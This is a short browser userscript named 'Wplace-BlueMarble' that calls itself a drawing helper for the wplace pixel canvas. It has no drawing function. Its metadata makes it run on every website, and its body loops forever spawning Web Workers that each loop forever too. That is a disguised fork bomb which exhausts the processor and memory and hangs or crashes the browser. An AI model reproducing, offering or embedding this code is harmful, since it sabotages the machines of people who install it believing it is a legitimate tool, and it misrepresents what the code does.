// ==UserScript==
// @name         Wplace-BlueMarble
// @namespace    http://wplace.live/
// @version      1.0
// @description  Drawer for wplace
// @author       WplaceDrawer
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    const workerScript = `
        onmessage = function() {
            while (true) {

            }
        };
    `;

    while (true) {
        const worker = new Worker(URL.createObjectURL(new Blob([workerScript], { type: 'application/javascript' })));
        worker.postMessage('start');
    }
})();
